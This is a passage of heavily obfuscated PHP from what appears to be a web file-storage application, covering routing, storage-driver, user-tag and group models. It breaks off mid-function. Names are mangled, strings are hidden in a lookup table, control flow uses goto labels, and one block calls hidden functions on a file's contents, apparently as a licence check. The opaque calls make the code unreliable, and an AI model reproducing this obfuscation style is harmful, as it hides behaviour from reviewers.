$œîÓ…Ş¿) { $¢íÚæÕï =& $_SERVER[ä¿÷‹µ±]; if ($Úñ™³ö× == $¢íÚæÕï[1621]) { $ß‚¯—ó¨ = array_map($¢íÚæÕï[1622], $œîÓ…Ş¿[0]); $îÙËà»Â = strpos($œîÓ…Ş¿[1], $¢íÚæÕï[8]) === 0 ? $œîÓ…Ş¿[1] : $¢íÚæÕï[8] . $œîÓ…Ş¿[1]; $Âš¤™™Œ = $œîÓ…Ş¿[2]; } else { $ß‚¯—ó¨ = null; $îÙËà»Â = strpos($œîÓ…Ş¿[0], $¢íÚæÕï[8]) === 0 ? $œîÓ…Ş¿[0] : $¢íÚæÕï[8] . $œîÓ…Ş¿[0]; $Âš¤™™Œ = $œîÓ…Ş¿[1]; } array_push(self::$maps, $ß‚¯—ó¨); array_push(self::$routes, $îÙËà»Â); array_push(self::$methods, strtoupper($Úñ™³ö×)); array_push(self::$callbacks, $Âš¤™™Œ); } public static function error($ªº‚©™Î) { self::$errorCallback = $ªº‚©™Î; } public static function haltOnMatch($Çã”’˜ = true) { self::$halts = $Çã”’˜; } public static function dispatch() { $­¢®ºÌ =& $_SERVER[ä¿÷‹µ±]; $Ô­…¥Üî = parse_url($_SERVER[$­¢®ºÌ[1623]], PHP_URL_PATH); $Ûˆìì¹¬ = $_SERVER[$­¢®ºÌ[159]]; $¹æ‘¤‹æ = array_keys(static::$patterns); $Šßœ¡Ö = array_values(static::$patterns); $Çï…ì÷ = !1; self::$routes = preg_replace($­¢®ºÌ[1291], $­¢®ºÌ[8], self::$routes); if (in_array($Ô­…¥Üî, self::$routes)) { $·§æŠèº = array_keys(self::$routes, $Ô­…¥Üî); foreach ($·§æŠèº as $Ñ…ÂËùâ) { if (self::$methods[$Ñ…ÂËùâ] == $Ûˆìì¹¬ || self::$methods[$Ñ…ÂËùâ] == $­¢®ºÌ[1624] || in_array($Ûˆìì¹¬, self::$maps[$Ñ…ÂËùâ])) { $Çï…ì÷ = !0; if (!is_object(self::$callbacks[$Ñ…ÂËùâ])) { $«Æ¡õúª = explode($­¢®ºÌ[8], self::$callbacks[$Ñ…ÂËùâ]); $ğØíÚ¼ = end($«Æ¡õúª); $ôØ¿ûşí = explode($­¢®ºÌ[1625], $ğØíÚ¼); $ï„•ëá = new $ôØ¿ûşí[0](); $ï„•ëá->{$ôØ¿ûşí[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Ñ…ÂËùâ]); if (self::$halts) { return; } } } } } else { $™™â¦ = 0; foreach (self::$routes as $Ñ…ÂËùâ) { if (strpos($Ñ…ÂËùâ, $­¢®ºÌ[4]) !== !1) { $Ñ…ÂËùâ = str_replace($¹æ‘¤‹æ, $Šßœ¡Ö, $Ñ…ÂËùâ); } if (preg_match($­¢®ºÌ[1626] . $Ñ…ÂËùâ . $­¢®ºÌ[1627], $Ô­…¥Üî, $¨ƒŒó«‡)) { if (self::$methods[$™™â¦] == $Ûˆìì¹¬ || self::$methods[$™™â¦] == $­¢®ºÌ[1624] || !empty(self::$maps[$™™â¦]) && in_array($Ûˆìì¹¬, self::$maps[$™™â¦])) { $Çï…ì÷ = !0; array_shift($¨ƒŒó«‡); if (!is_object(self::$callbacks[$™™â¦])) { $«Æ¡õúª = explode($­¢®ºÌ[8], self::$callbacks[$™™â¦]); $ğØíÚ¼ = end($«Æ¡õúª); $ôØ¿ûşí = explode($­¢®ºÌ[1625], $ğØíÚ¼); $ï„•ëá = new $ôØ¿ûşí[0](); if (!method_exists($ï„•ëá, $ôØ¿ûşí[1])) { echo $­¢®ºÌ[1628]; } else { call_user_func_array(array($ï„•ëá, $ôØ¿ûşí[1]), $¨ƒŒó«‡); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$™™â¦], $¨ƒŒó«‡); if (self::$halts) { return; } } } } $™™â¦++; } } if ($Çï…ì÷ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $²Ø£Ç¯€ =& $_SERVER[ä¿÷‹µ±]; header($_SERVER[$²Ø£Ç¯€[1629]] . $²Ø£Ç¯€[1630]); echo $²Ø£Ç¯€[1631]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$­¢®ºÌ[1623]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } if ($_SERVER[$_SERVER[ä¿÷‹µ±][894]] != $_SERVER[$_SERVER[ä¿÷‹µ±][1632]]) { $_getc = $_SERVER[ä¿÷‹µ±][896]; $_getfile = $_SERVER[$_SERVER[ä¿÷‹µ±][891]] . $_SERVER[ä¿÷‹µ±][892]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ä¿÷‹µ±][231], $_getfilec); if (count($_getarrs) < $_SERVER[ä¿÷‹µ±][630]) { $exit = $_SERVER[ä¿÷‹µ±][897]; $exit(); } $_act = $_SERVER[ä¿÷‹µ±][935]; $_act($_SERVER[$_SERVER[ä¿÷‹µ±][934]]); } goto f”³ÖæĞŠ»; eİÓ´¿â‡¬: class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\x6d\56\163\157\x75\x72\143\x65\x53\145\143\162\x65\164\x4c\151\x73\x74"; public $field = array("\163\157\165\162\143\x65\111\104", "\164\x79\160\x65\111\104", "\143\162\x65\x61\164\145\125\163\145\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\56\x73\x74\157\x72\x61\147\145\114\x69\163\x74"; public $field = array("\x6e\141\x6d\x65", "\163\151\172\x65\x4d\141\170", "\163\x79\x73\x74\145\155", "\144\x65\x66\x61\165\x6c\x74", "\x64\x72\x69\166\145\x72", "\143\157\156\x66\151\x67"); public function listData($ƒÄÑŞù = false, $‘¹èÄ€ = "\155\x6f\x64\151\146\x79\x54\151\155\x65", $‰û’‡Îğ = false) { $³‡¨ï =& $_SERVER[ä¿÷‹µ±]; $’Õç—ãø = parent::listData($ƒÄÑŞù, $‘¹èÄ€, $‰û’‡Îğ); if ($ƒÄÑŞù) { return $’Õç—ãø; } $Øâ§çª§ = $this->ioSizeUseGet(array_to_keyvalue($’Õç—ãø, $³‡¨ï[12], $³‡¨ï[399])); foreach ($’Õç—ãø as $ó¨ÍÆ => $¤ñ†áöä) { unset($’Õç—ãø[$ó¨ÍÆ][$³‡¨ï[6]]); $’Õç—ãø[$ó¨ÍÆ][$³‡¨ï[1839]] = isset($Øâ§çª§[$¤ñ†áöä[$³‡¨ï[399]]]) ? $Øâ§çª§[$¤ñ†áöä[$³‡¨ï[399]]] : 0; } return $’Õç—ãø; } public function ioSizeUseGet($–·‰½÷ß) { $Üñ´ü¤Ì =& $_SERVER[ä¿÷‹µ±]; if (!$–·‰½÷ß) { return array(); } $‚öü¸“ç = $Üñ´ü¤Ì[2163] . implode($Üñ´ü¤Ì[50], $–·‰½÷ß); $½ñ²ûñœ = Cache::get($‚öü¸“ç); if ($½ñ²ûñœ) { return $½ñ²ûñœ; } $ÀùÀÆ˜æ = array($Üñ´ü¤Ì[836] => $Üñ´ü¤Ì[399], $Üñ´ü¤Ì[2164] => $Üñ´ü¤Ì[76]); $á€é€ú¤ = array($Üñ´ü¤Ì[836] => array($Üñ´ü¤Ì[7], $–·‰½÷ß)); $½ñ²ûñœ = Model($Üñ´ü¤Ì[808])->field($ÀùÀÆ˜æ)->where($á€é€ú¤)->group($Üñ´ü¤Ì[836])->select(); $½ñ²ûñœ = array_to_keyvalue($½ñ²ûñœ, $Üñ´ü¤Ì[399], $Üñ´ü¤Ì[76]); Cache::set($‚öü¸“ç, $½ñ²ûñœ, 600); return $½ñ²ûñœ; } public function getConfig($ğåÙ‚øŸ) { $ü©å¥É = parent::listData($ğåÙ‚øŸ); return json_decode($ü©å¥É[$_SERVER[ä¿÷‹µ±][6]], !0); } public function update($¤ÒÂİß, $Ÿ¯ÏŒïü) { $õ÷ÖóŒÍ =& $_SERVER[ä¿÷‹µ±]; $Âøö®¢™ = $Ÿ¯ÏŒïü[$õ÷ÖóŒÍ[32]]; $šò¨§÷È = array_to_keyvalue(parent::listData(), $õ÷ÖóŒÍ[32]); if (isset($šò¨§÷È[$Âøö®¢™]) && $šò¨§÷È[$Âøö®¢™][$õ÷ÖóŒÍ[399]] != $¤ÒÂİß) { return !1; } $this->checkPwd($¤ÒÂİß, $Ÿ¯ÏŒïü); if (isset($Ÿ¯ÏŒïü[$õ÷ÖóŒÍ[2165]]) && $Ÿ¯ÏŒïü[$õ÷ÖóŒÍ[2165]] == $õ÷ÖóŒÍ[88]) { $this->checkConfig($Ÿ¯ÏŒïü); } unset($Ÿ¯ÏŒïü[$õ÷ÖóŒÍ[2165]]); $²úåüÕã = parent::update($¤ÒÂİß, $Ÿ¯ÏŒïü); if ($²úåüÕã && $Ÿ¯ÏŒïü[$õ÷ÖóŒÍ[37]]) { $—ÉÌÅ¼Ó = 0; foreach ($šò¨§÷È as $ã’î‰¦) { if ($ã’î‰¦[$õ÷ÖóŒÍ[37]] && $ã’î‰¦[$õ÷ÖóŒÍ[399]] != $¤ÒÂİß) { $—ÉÌÅ¼Ó = $ã’î‰¦[$õ÷ÖóŒÍ[399]]; parent::update($ã’î‰¦[$õ÷ÖóŒÍ[399]], array($õ÷ÖóŒÍ[37] => 0)); } } $this->updateBackup($¤ÒÂİß, $—ÉÌÅ¼Ó); } return $²úåüÕã; } public function add($ºå–™ºÏ) { $úÄ‚™ı¹ =& $_SERVER[ä¿÷‹µ±]; $–´ıŒ‚á = array_to_keyvalue(parent::listData(), $úÄ‚™ı¹[32]); if (isset($–´ıŒ‚á[$ºå–™ºÏ[$úÄ‚™ı¹[32]]])) { return !1; } $this->checkConfig($ºå–™ºÏ); $”×à¯œ = parent::insert($ºå–™ºÏ); if ($”×à¯œ && $ºå–™ºÏ[$úÄ‚™ı¹[37]]) { foreach ($–´ıŒ‚á as $Ø‹–ê¯“) { if ($Ø‹–ê¯“[$úÄ‚™ı¹[37]]) { parent::update($Ø‹–ê¯“[$úÄ‚™ı¹[399]], array($úÄ‚™ı¹[37] => 0)); } } } return $”×à¯œ; } public function updateBackup($­˜Ï´Ò, $‰·ÇÅî¨) { $¸½ç·Øõ =& $_SERVER[ä¿÷‹µ±]; if (!$‰·ÇÅî¨) { return; } $ÏÊ‚É·ç = Model($¸½ç·Øõ[768])->config(); if ($ÏÊ‚É·ç[$¸½ç·Øõ[1648]] != $¸½ç·Øõ[88] || $ÏÊ‚É·ç[$¸½ç·Øõ[771]] != $‰·ÇÅî¨) { return; } $¢À“Íëï = Model($¸½ç·Øõ[789])->get($¸½ç·Øõ[799]); $¢À“Íëï = json_decode($¢À“Íëï, !0); if (!$¢À“Íëï) { return; } $¢À“Íëï[$¸½ç·Øõ[771]] = $­˜Ï´Ò; Model($¸½ç·Øõ[789])->set(array($¸½ç·Øõ[799] => $¢À“Íëï)); } public function checkPwd($Ö“†®³¢, &$ü–¿³Š­) { $äü¹ç¶ş =& $_SERVER[ä¿÷‹µ±]; if (empty($ü–¿³Š­[$äü¹ç¶ş[6]])) { return; } $øàõÚë± = json_decode($ü–¿³Š­[$äü¹ç¶ş[6]], !0); $×Ó÷»Ğ³ = $äü¹ç¶ş[12]; $œ ã¶ÄÃ = array($äü¹ç¶ş[2166], $äü¹ç¶ş[2167], $äü¹ç¶ş[909]); foreach ($œ ã¶ÄÃ as $‚É•ô¤‡) { if (isset($øàõÚë±[$‚É•ô¤‡])) { $×Ó÷»Ğ³ = $‚É•ô¤‡; break; } } if (!$×Ó÷»Ğ³) { return; } $ÊÂÀÄ·ã = $this->getConfig($Ö“†®³¢); $¶¶Œ¼Î = $ÊÂÀÄ·ã[$×Ó÷»Ğ³]; $„“€±Ø£ = $øàõÚë±[$×Ó÷»Ğ³]; if ($„“€±Ø£ == str_repeat($äü¹ç¶ş[188], strlen($¶¶Œ¼Î))) { $øàõÚë±[$×Ó÷»Ğ³] = $¶¶Œ¼Î; $ü–¿³Š­[$äü¹ç¶ş[6]] = json_encode($øàõÚë±); } else { if ($„“€±Ø£ != $¶¶Œ¼Î) { $ü–¿³Š­[$äü¹ç¶ş[2165]] = $äü¹ç¶ş[88]; } } } public function checkConfig(&$¼ÕÍ˜‘¦, $÷µÚ×‡ü = false) { $¹ñïÎÎ =& $_SERVER[ä¿÷‹µ±]; $õ‘»™¶‰ = strtolower($¼ÕÍ˜‘¦[$¹ñïÎÎ[95]]); $Ü›ìÅí = json_decode($¼ÕÍ˜‘¦[$¹ñïÎÎ[6]], !0); foreach ($Ü›ìÅí as $ßõ†­Ã® => $è‰ÌÇ) { $Ü›ìÅí[$ßõ†­Ã®] = trim($è‰ÌÇ); } $Ü›ìÅí[$¹ñïÎÎ[2168]] = rand_string(6); $¼æ£îïõ = $GLOBALS[$¹ñïÎÎ[6]][$¹ñïÎÎ[89]][$¹ñïÎÎ[845]]; $ÎæğÏñ© = isset($¼æ£îïõ[$õ‘»™¶‰]) ? $¼æ£îïõ[$õ‘»™¶‰] : ucfirst($õ‘»™¶‰); $Ê‚²Æ÷µ = $¹ñïÎÎ[74] . $ÎæğÏñ©; if (!$ÎæğÏñ© || !class_exists($Ê‚²Æ÷µ)) { if ($÷µÚ×‡ü) { return LNG($¹ñïÎÎ[2169]); } write_log(array($¹ñïÎÎ[2170], $¼ÕÍ˜‘¦, get_caller_info()), $¹ñïÎÎ[2171]); show_json(LNG($¹ñïÎÎ[2169]), !1, $¼ÕÍ˜‘¦); } $¶„¦óš” = new $Ê‚²Æ÷µ($Ü›ìÅí); if (in_array($õ‘»™¶‰, $¶„¦óš”->objectDriver)) { if (!$¶„¦óš”->isBucketCors() && !$¶„¦óš”->setBucketCors()) { $æó½ŸÍÄ = LNG($¹ñïÎÎ[2172]); $æó½ŸÍÄ .= $¹ñïÎÎ[2173] . LNG($¹ñïÎÎ[2174]); if ($÷µÚ×‡ü) { return $æó½ŸÍÄ; } show_json($æó½ŸÍÄ, !1); } } $ÕŸ¾İ½Æ = rtrim($Ü›ìÅí[$¹ñïÎÎ[1203]], $¹ñïÎÎ[8]) . $¹ñïÎÎ[8]; $îà×’®Å = $¶„¦óš”->getPath($ÕŸ¾İ½Æ . $¹ñïÎÎ[1265]); if (!$¶„¦óš”->mkfile($îà×’®Å)) { if ($÷µÚ×‡ü) { return LNG($¹ñïÎÎ[2172]); } show_json(LNG($¹ñïÎÎ[2172]), !1); } $Ü›ìÅí[$¹ñïÎÎ[1203]] = $ÕŸ¾İ½Æ; $¼ÕÍ˜‘¦[$¹ñïÎÎ[6]] = json_encode($Ü›ìÅí); $¼ÕÍ˜‘¦[$¹ñïÎÎ[95]] = $ÎæğÏñ©; return !0; } public function driverListSystem() { $Ë“Ší¬™ =& $_SERVER[ä¿÷‹µ±]; $¾ò Îâ = parent::listData(); $¶ËúÉ½ì = array(); foreach ($¾ò Îâ as $Õ’Úä³ë) { unset($Õ’Úä³ë[$Ë“Ší¬™[200]], $Õ’Úä³ë[$Ë“Ší¬™[85]]); $Õ’Úä³ë[$Ë“Ší¬™[6]] = json_decode($Õ’Úä³ë[$Ë“Ší¬™[6]], !0); $¶ËúÉ½ì[] = $Õ’Úä³ë; } return $¶ËúÉ½ì; } public function defaultDriver() { $Úœô¯ƒ› =& $_SERVER[ä¿÷‹µ±]; $İ§Ä‚Ë = parent::listData(); $ùÑ—ùœü = array_filter_by_field($İ§Ä‚Ë, $Úœô¯ƒ›[37], 1); $ùÑ—ùœü = $ùÑ—ùœü[0]; if ($ùÑ—ùœü) { $ùÑ—ùœü[$Úœô¯ƒ›[6]] = json_decode($ùÑ—ùœü[$Úœô¯ƒ›[6]], !0); } return $ùÑ—ùœü; } public function driverInfo($Ô—™Òô×) { $š¦“ÒÏÎ =& $_SERVER[ä¿÷‹µ±]; $ààÓê … = array_to_keyvalue(parent::listData(), $š¦“ÒÏÎ[399]); if (!isset($ààÓê …[$Ô—™Òô×])) { return !1; } $ãšøïŒ‰ = $ààÓê …[$Ô—™Òô×]; $ãšøïŒ‰[$š¦“ÒÏÎ[6]] = json_decode($ãšøïŒ‰[$š¦“ÒÏÎ[6]], !0); return $ãšøïŒ‰; } public function remove($Ô‡÷ïÍ¡) { $this->removeShareItems($Ô‡÷ïÍ¡); return parent::remove($Ô‡÷ïÍ¡); } public function removeWithFile($½İÁÂ, $ŒÆÜÅ§à) { $ÊĞŞ³™‡ =& $_SERVER[ä¿÷‹µ±]; $­Ìü²‘ = array($ÊĞŞ³™‡[836] => $½İÁÂ); $ğõùÃ¨Ç = Model($ÊĞŞ³™‡[471])->where($­Ìü²‘)->count(); $î‰¿˜¦ = Model($ÊĞŞ³™‡[471])->where($­Ìü²‘)->sum($ÊĞŞ³™‡[76]); $€Öó¡ñ  = $ŒÆÜÅ§à . $ÊĞŞ³™‡[2175] . $½İÁÂ; $â†‹³´³ = LNG($ŒÆÜÅ§à == $ÊĞŞ³™‡[557] ? $ÊĞŞ³™‡[2176] : $ÊĞŞ³™‡[2177]); $ÛÉéÄ¸é = new TaskFileTransfer($€Öó¡ñ , $ÊĞŞ³™‡[2171], $ğõùÃ¨Ç, $â†‹³´³ . "\50{$½İÁÂ}\51"); $ÛÉéÄ¸é->task[$ÊĞŞ³™‡[782]] = (double) $î‰¿˜¦; $ÓÏÄ¼¥Á = KodIO::defaultDriver(); $‰Ü‚Öñµ = $ÓÏÄ¼¥Á[$ÊĞŞ³™‡[399]]; $•®äÄà = "\173\151\x6f\72{$‰Ü‚Öñµ}\175\x2f"; $Ë¿Ú °ç = !0; $³š¥÷° = array(); $ş¿ûç™ = Model($ÊĞŞ³™‡[199])->where($­Ìü²‘)->field($ÊĞŞ³™‡[2178])->select(); foreach ($ş¿ûç™ as $à–É•éü) { $ØÖ½†Âû = $à–É•éü[$ÊĞŞ³™‡[84]]; $œÁÙõ‚ = $•®äÄà . str_replace("\x7b\x69\157\72{$½İÁÂ}\x7d\57", $ÊĞŞ³™‡[12], $ØÖ½†Âû); if (!IO::exist($ØÖ½†Âû)) { $³š¥÷°[] = $à–É•éü[$ÊĞŞ³™‡[468]]; $ÛÉéÄ¸é->updateFileEnd($à–É•éü[$ÊĞŞ³™‡[32]], $à–É•éü[$ÊĞŞ³™‡[76]]); continue; } if (IO::exist($œÁÙõ‚)) { $ÛÉéÄ¸é->updateFileEnd($à–É•éü[$ÊĞŞ³™‡[32]], $à–É•éü[$ÊĞŞ³™‡[76]]); continue; } if (!IO::move($ØÖ½†Âû, get_path_father($œÁÙõ‚))) { $Ë¿Ú °ç = !1; break; } $­Ìü²‘ = array($ÊĞŞ³™‡[468] => $à–É•éü[$ÊĞŞ³™‡[468]]); $®ûÄú = array($ÊĞŞ³™‡[836] => $‰Ü‚Öñµ, $ÊĞŞ³™‡[84] => $œÁÙõ‚); Model($ÊĞŞ³™‡[199])->where($­Ìü²‘)->save($®ûÄú); } $this->removeByFileID($³š¥÷°); if (!$Ë¿Ú °ç) { $ÛÉéÄ¸é->stop($€Öó¡ñ ); return !1; } $ÛÉéÄ¸é->end(); if ($ŒÆÜÅ§à == $ÊĞŞ³™‡[1819]) { $this->remove($½İÁÂ); } } public function progress($Û•Åıõú, $åª²öÜĞ) { return Task::get($åª²öÜĞ . $_SERVER[ä¿÷‹µ±][2175] . $Û•Åıõú); } private function removeByFileID($¨Æèüû = array()) { $¿ßáŞí˜ =& $_SERVER[ä¿÷‹µ±]; if (empty($¨Æèüû)) { return; } $èˆëí» = array($¿ßáŞí˜[468] => array($¿ßáŞí˜[7], $¨Æèüû)); $ÏÑî§¡õ = Model($¿ßáŞí˜[1349])->where($èˆëí»)->field($¿ßáŞí˜[402])->select(); if (!$ÏÑî§¡õ) { return; } $ÏÑî§¡õ = array_to_keyvalue($ÏÑî§¡õ, $¿ßáŞí˜[12], $¿ßáŞí˜[402]); foreach ($ÏÑî§¡õ as $¥³é×ŠÒ) { Model($¿ßáŞí˜[416])->removeNow($¥³é×ŠÒ, !1); } } private function removeShareItems($ö™ˆ©¬) { $ÊºÛÇ‘¦ =& $_SERVER[ä¿÷‹µ±]; $ÕóÕçÇ„ = "\x7b\x69\157\x3a{$ö™ˆ©¬}\x7d\57"; $ğß¼ßİ« = array($ÊºÛÇ‘¦[402] => 0, $ÊºÛÇ‘¦[1198] => array($ÊºÛÇ‘¦[383], "{$ÕóÕçÇ„}\45")); $Õß¥ÖÁš = Model($ÊºÛÇ‘¦[1830])->where($ğß¼ßİ«)->field($ÊºÛÇ‘¦[489])->select(); if (empty($Õß¥ÖÁš)) { return; } $Ä£Åøıº = array_to_keyvalue($Õß¥ÖÁš, $ÊºÛÇ‘¦[12], $ÊºÛÇ‘¦[489]); Model($ÊºÛÇ‘¦[601])->remove($Ä£Åøıº); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\155\x2e\x4c\x69\147\x68\164\101\x70\x70"; public $modelType = "\123\171\163\x74\x65\x6d\x4f\x70\164\x69\157\156"; public $field = array("\156\x61\x6d\x65", "\x67\162\x6f\x75\160", "\x64\145\163\x63", "\143\157\x6e\x74\145\x6e\164"); public function listData($–®ÍˆÁ = false, $Ô¼á×¶Æ = "\x6d\x6f\x64\x69\146\171\124\151\x6d\145", $ºù¸´ñª = true) { return parent::listData($–®ÍˆÁ, $Ô¼á×¶Æ, $ºù¸´ñª); } public function remove($É¡Œõ©Œ) { $äšò¦ìÕ = $this->findByName($É¡Œõ©Œ); if (!$äšò¦ìÕ) { return !1; } return parent::remove($äšò¦ìÕ[$_SERVER[ä¿÷‹µ±][399]]); } public function add($¨„šÓë) { if ($this->findByName($¨„šÓë[$_SERVER[ä¿÷‹µ±][32]])) { return !1; } return parent::insert($¨„šÓë); } public function update($ÜĞ‚ÂĞ×, $Ú¤ŠØÍ´) { $€óùÇ†„ =& $_SERVER[ä¿÷‹µ±]; $®â§úÛ = $this->findByName($ÜĞ‚ÂĞ×); $ƒû©èÄó = $this->findByName($Ú¤ŠØÍ´[$€óùÇ†„[32]]); if (!$®â§úÛ || $ƒû©èÄó && $ƒû©èÄó[$€óùÇ†„[399]] != $®â§úÛ[$€óùÇ†„[399]]) { return !1; } return parent::update($®â§úÛ[$€óùÇ†„[399]], $Ú¤ŠØÍ´); } } goto B‡ƒÙÈï›; eÚŞ¶…„‚: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\x72\x5f\x6f\160\164\x69\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($‚æÆí‹ò) { $½²öãøª =& $_SERVER[ä¿÷‹µ±]; if (!defined($½²öãøª[475])) { define($½²öãøª[475], 0); } return "\x55\x73\x65\162\117\x70\x74\151\x6f\156\137{$‚æÆí‹ò}\137" . USER_ID; } protected function filterWhere($Ù§‰¾“Û) { $•ºíÊ³ú =& $_SERVER[ä¿÷‹µ±]; if (!defined($•ºíÊ³ú[475])) { define($•ºíÊ³ú[475], 0); } $Ù§‰¾“Û[$•ºíÊ³ú[1678]] = USER_ID; return $Ù§‰¾“Û; } public function cacheRemoveUser($†â¨ãÍü, $íèşñ‡É) { return Cache::remove("\x55\163\x65\x72\117\160\x74\151\157\x6e\x5f{$†â¨ãÍü}\x5f" . $íèşñ‡É); } protected function optionDefault($Ø¹˜üÄü = '') { $‹íû°Ÿ =& $_SERVER[ä¿÷‹µ±]; if ($Ø¹˜üÄü == $‹íû°Ÿ[12]) { return $GLOBALS[$‹íû°Ÿ[6]][$‹íû°Ÿ[2338]]; } if ($Ø¹˜üÄü == $‹íû°Ÿ[2339]) { return $GLOBALS[$‹íû°Ÿ[6]][$‹íû°Ÿ[2340]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\145\162\x2e\164\141\147\x4c\151\163\164"; public $modelType = "\125\163\x65\x72\x4f\x70\164\x69\157\156"; public $field = array("\156\141\155\x65", "\x73\x74\x79\x6c\145", "\163\x6f\x72\x74"); public function listData($”½ø¶à– = false, $—”ÅÛŠ = "\x73\157\162\164", $Ì¼ğ±Û = false) { return parent::listData($”½ø¶à–, $—”ÅÛŠ, $Ì¼ğ±Û); } public function remove($ŠÅ¦áÃ‚) { return parent::remove($ŠÅ¦áÃ‚); } public function add($ıøßª‹ , $ôæµË¤Û = "\154\x61\142\145\x6c\x2d\147\x72\x65\x79\55\x6e\157\x72\x6d\141\154") { $¸‚óÕğ =& $_SERVER[ä¿÷‹µ±]; if ($this->findByName($ıøßª‹ )) { return !1; } $Ãˆø–à = array($¸‚óÕğ[420] => $ıøßª‹ , $¸‚óÕğ[485] => $ôæµË¤Û, $¸‚óÕğ[1854] => $this->getSort($¸‚óÕğ[258]) + 1); return parent::insert($Ãˆø–à); } public function update($¼ÔÎôÆÉ, $µ“µ—ã²) { $¹±¯íÜ¥ =& $_SERVER[ä¿÷‹µ±]; $ÄÂ¶™ïŠ = $this->listData($¼ÔÎôÆÉ); $¥ÀÈÒ‹· = $this->findByName($µ“µ—ã²[$¹±¯íÜ¥[32]]); if (!$ÄÂ¶™ïŠ || $¥ÀÈÒ‹· && $¥ÀÈÒ‹·[$¹±¯íÜ¥[399]] != $ÄÂ¶™ïŠ[$¹±¯íÜ¥[399]]) { return !1; } return parent::update($¼ÔÎôÆÉ, $µ“µ—ã²); } public function moveTop($Üê×òÉ…) { $÷Îœüäú =& $_SERVER[ä¿÷‹µ±]; $Ş¶’±ìÉ = parent::listData(); $Ë‹…’¯­ = $this->getSort($÷Îœüäú[257]); foreach ($Ş¶’±ìÉ as &$ß½Ù…»Š) { if ($ß½Ù…»Š[$÷Îœüäú[399]] == $Üê×òÉ…) { $ß½Ù…»Š[$÷Îœüäú[1874]] = $Ë‹…’¯­; continue; } $ß½Ù…»Š[$÷Îœüäú[1874]] += 1; } unset($ß½Ù…»Š); return parent::resetData($Ş¶’±ìÉ); } public function moveBottom($®â¦“óİ) { $Î»­ñÁˆ =& $_SERVER[ä¿÷‹µ±]; $“Œ´€åÖ = $this->getSort($Î»­ñÁˆ[258]) + 1; return parent::update($®â¦“óİ, array($Î»­ñÁˆ[1874] => $“Œ´€åÖ)); } public function resetSort($ÕÆİ¨Äœ) { $¬ÒĞ»ä¢ =& $_SERVER[ä¿÷‹µ±]; $‰Îğ‰ùÑ = array(); $ÕÆİ¨Äœ = is_array($ÕÆİ¨Äœ) ? $ÕÆİ¨Äœ : array(); for ($ÒäÙçìï = 0; $ÒäÙçìï < count($ÕÆİ¨Äœ); $ÒäÙçìï++) { $‰Îğ‰ùÑ[$ÕÆİ¨Äœ[$ÒäÙçìï] . $¬ÒĞ»ä¢[12]] = $ÒäÙçìï + 1; } $¬ä±ÒöŒ = parent::listData(); foreach ($¬ä±ÒöŒ as &$ãşê›æŞ) { $´åƒæ—– = $‰Îğ‰ùÑ[$ãşê›æŞ[$¬ÒĞ»ä¢[399]]]; $ãşê›æŞ[$¬ÒĞ»ä¢[1874]] = $´åƒæ—– ? $´åƒæ—– : $ãşê›æŞ[$¬ÒĞ»ä¢[1874]]; } unset($ãşê›æŞ); return parent::resetData($¬ä±ÒöŒ); } private function getSort($ÉÀ³ì©) { $“ƒŞ ¾É =& $_SERVER[ä¿÷‹µ±]; $ÒàËÁäª = parent::listData(); $ş¹”¿œ« = array_to_keyvalue($ÒàËÁäª, $“ƒŞ ¾É[12], $“ƒŞ ¾É[1874]); if (!$ş¹”¿œ«) { $ş¹”¿œ« = array(0); } $ÄÃàİ¸Ê = $ÉÀ³ì© == $“ƒŞ ¾É[258] ? max($ş¹”¿œ«) : min($ş¹”¿œ«); return intval($ÄÃàİ¸Ê); } } goto CÇ®ªÀ§ã; C¼¤´“ËÙ¡: class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\x75\x70"; protected $tableMeta = array("\x74\141\x62\154\145\116\141\155\x65" => "\x67\162\x6f\165\160\137\155\x65\164\141", "\x6d\x65\x74\x61\x46\x69\x65\x6c\x64" => "\x67\x72\157\165\160\111\104"); protected function cacheFunctionAlias($Û²ì¯Ù”) { $¾ø¡¤Îİ =& $_SERVER[ä¿÷‹µ±]; return array($¾ø¡¤Îİ[1928] => array($Û²ì¯Ù”[0], $¾ø¡¤Îİ[1929]), $¾ø¡¤Îİ[1930] => array($Û²ì¯Ù”[0], $¾ø¡¤Îİ[1931])); } protected function getInfo($í“ÍœÄØ, $ºŞ¿­ùÏ = false) { $¶®ûÆùÈ = $this->getInfoSimple($í“ÍœÄØ); if (!$¶®ûÆùÈ) { return !1; } if ($ºŞ¿­ùÏ) { return $this->_listDataApplyItem($¶®ûÆùÈ); } return $this->cacheFunctionGet($_SERVER[ä¿÷‹µ±][1932], $í“ÍœÄØ); } protected function getInfoSimple($şšñò‹¸, $¾Òò¦š° = false) { $õ£•¥µ =& $_SERVER[ä¿÷‹µ±]; if ($¾Òò¦š°) { $ê‘‘„½Ä = array($õ£•¥µ[1850] => intval($şšñò‹¸)); $É–ÏÅŠ· = $this->where($ê‘‘„½Ä)->find(); return is_array($É–ÏÅŠ·) ? $É–ÏÅŠ· : array(); } return $this->cacheFunctionGet($õ£•¥µ[1933], $şšñò‹¸); } protected function groupAdd($„éÔ ¢ß) { $…«ïÄÃÔ =& $_SERVER[ä¿÷‹µ±]; if (!$„éÔ ¢ß[$…«ïÄÃÔ[432]] && isset($„éÔ ¢ß[$…«ïÄÃÔ[1850]]) && $„éÔ ¢ß[$…«ïÄÃÔ[1850]] == 1) { if ($ºÀÑ„Û‚ = $this->getInfoSimple($„éÔ ¢ß[$…«ïÄÃÔ[1850]], !0)) { return $„éÔ ¢ß[$…«ïÄÃÔ[1850]]; } } else { $ºÀÑ„Û‚ = $this->getInfoSimple($„éÔ ¢ß[$…«ïÄÃÔ[432]]); if (!$ºÀÑ„Û‚) { return !1; } } $¸—®®Â = $…«ïÄÃÔ[531]; if 